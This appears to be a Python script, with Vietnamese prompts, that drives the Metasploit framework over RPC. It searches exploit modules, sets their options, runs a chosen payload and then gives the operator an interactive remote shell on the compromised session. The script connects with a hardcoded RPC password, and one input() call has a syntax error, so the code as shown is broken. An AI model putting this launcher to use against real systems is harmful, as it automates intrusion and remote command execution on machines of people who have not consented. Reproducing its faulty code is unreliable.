from pymetasploit3.msfrpc import MsfRpcClient



def Check_Required_Options(exploit): 
    for ch in exploit.missing_required: 
        if (exploit[ch] == None): 
            exploit[ch] = input("Nhap thong tin %s de tien hanh khai thac", %ch)
  
  
  
searchModules = True
client = MsfRpcClient('abc@123')
matching = [s for s in client.modules.exploits if "groovy" in s]
if searchModules == True: 
    SearchString = input("nhap ten module de tim: ")
    matching = [s for s in client.modules.exploits if SearchString in s]
    print("module phu hop:")
    for s in matching: 
        print(s)
        
print("\n\nChon module de exploit") 
module = input()
exploit = client.modules.use('exploit', module)
Check_Required_Options(exploit)

print("\n\nMot so payload phu hop de khai thac:\n")
for ch in exploit.targetpayloads(): 
    print(ch)
    
print("\n\nChon payload: ")
targetPayload = input()

print("\n\n THUC THI PAYLOAD!!!")
result = exploit.execute(payload=targetPayload) 
if result['job_id'] != None: 
    print("PAYLOAD THUC THI THANH CONG") 
    # tuong tac voi payload
    try: 
        print("list session:\n")
        for session in client.sessions.list: 
            print(session) 
        print("chon session de tuong tac:\n")
        shell = client.sessions.session(input())
        ## thuc thi shell: 
        while True: 
            shell.write(input("Nhap shell de thuc thi")) 
            print(shell.read())
    except KeyboardInterrupt:
        print("Nhan control-c de thoat !") 
         
        
            
else: 
    print("Thuc thi shell khong thanh cong") 
    
        